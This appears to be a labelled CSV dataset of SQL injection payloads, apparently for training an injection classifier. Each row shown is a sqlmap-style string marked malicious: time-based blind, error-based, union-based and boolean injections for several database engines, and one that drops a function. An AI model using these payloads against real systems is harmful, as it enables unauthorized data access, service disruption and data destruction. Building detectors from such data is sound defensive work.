row_index,payload_norm,label,sqli_type_hint
7620,1'+ ( select brgo where 9100 = 9100 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
7621,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'xdfz' = 'xdfz",1,
7622,"-9451%"" ) union all select 9963,9963,9963--",1,
7623,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""tqbi"" = ""tqbi",1,
7624,1%' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( '%' = ',1,
7625,"-4095' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
7626,if ( 2823 = 3532 ) select 2823 else drop function kmqw--,1,
7627,1' where 2690 = 2690,1,
7628,"1%' ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7629,"-6155%' ) ) union all select 2421,2421,2421,2421,2421#",1,
7630,"1' ) as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
7631,1' ) ) or sleep ( 5 ) and ( ( 'zxik' = 'zxik,1,
7632,"1'+ ( select 'qmtx' where 6992 = 6992 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
7633,"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""wvyb"" = ""wvyb",1,
7634,"-1763%"" or ( 8459 = 8459 ) *4906 and ""%"" = """,1,
7635,"1"" ) ) as qqhm where 7182 = 7182",1,
7636,"-4694%"" ) ) ) union all select 9178,9178,9178,9178,9178--",1,
7637,1 ) ) as qgma where 7675 = 7675 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
7638,"-3626%"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""%"" = """,1,
7639,1 ) ) ) and 2006 = 2006,1,
7640,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'sbey' = 'sbey",1,
7641,"-8783' ) ) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",1,
7642,-8032%' ) ) ) or 9323 = 9323#,1,
7643,1'+ ( select 'kiqf' where 5920 = 5920,1,
7644,"1' ) ) as hbdi where 6758 = 6758 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
7645,"1%"" ) ) ) union all select null,null,null,null--",1,
7646,"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""nepk"" = ""nepk",1,
7647,-7452' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'nmdq' like 'nmdq,1,
7648,"-8773%' ) ) ) union all select 8941,8941,8941,8941,8941,8941#",1,
7649,"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",1,
